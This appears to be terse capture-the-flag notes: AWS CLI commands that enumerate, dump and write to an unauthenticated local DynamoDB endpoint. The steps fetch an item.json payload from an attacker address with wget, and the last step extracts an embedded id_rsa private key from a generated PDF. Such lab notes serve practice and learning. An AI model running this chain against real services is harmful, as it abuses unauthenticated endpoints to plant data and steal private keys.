# Enumeration
## List tables :
```bash
aws dynamodb list-tables --endpoint-url http://localhost:4566 --no-sign-request
```

## Dump table :
```bash
aws dynamodb scan --table-name alerts --endpoint-url http://localhost:4566 --no-sign-request
```

## Create table:
```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S \
    --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE \
    --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --tags Key=Owner,Value=blueTeam \
    --endpoint-url http://localhost:4566 --no-sign-request 
```

## Fetch item.json file:
```bash
rm item.json && wget http://10.10.14.10:8000/item.json
```
## Put item in the table:
```bash
aws dynamodb put-item \
    --table-name alerts \
    --item file://item.json \
    --return-consumed-capacity TOTAL \
    --return-item-collection-metrics SIZE \
    --endpoint-url http://localhost:4566 --no-sign-request 
```
## Extract embedded attached file from pdf.
```bash
 pdfdetach -saveall id_rsa.pdf
```